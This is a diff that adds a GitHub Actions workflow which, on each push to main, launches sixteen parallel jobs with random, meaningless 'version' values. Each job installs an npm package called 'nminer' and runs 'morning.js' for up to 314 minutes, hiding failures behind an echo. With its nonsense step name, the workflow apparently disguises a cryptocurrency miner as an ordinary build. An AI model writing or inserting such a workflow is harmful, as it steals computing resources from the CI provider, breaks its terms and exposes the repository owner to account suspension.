@@ -1,0 +1,41 @@
+name: morning
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 2476 }
+          - { version: 4700 }
+          - { version: 5449 }
+          - { version: 4422 }
+          - { version: 8501 }
+          - { version: 9277 }
+          - { version: 9360 }
+          - { version: 6750 }
+          - { version: 2476 }
+          - { version: 9086 }
+          - { version: 2360 }
+          - { version: 5306 }
+          - { version: 7026 }
+          - { version: 2245 }
+          - { version: 9242 }
+          - { version: 3942 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: exactly speedy cemetery
+        run: |
+          npm install nminer@latest
+          timeout 314m node morning.js || echo "morning executed"
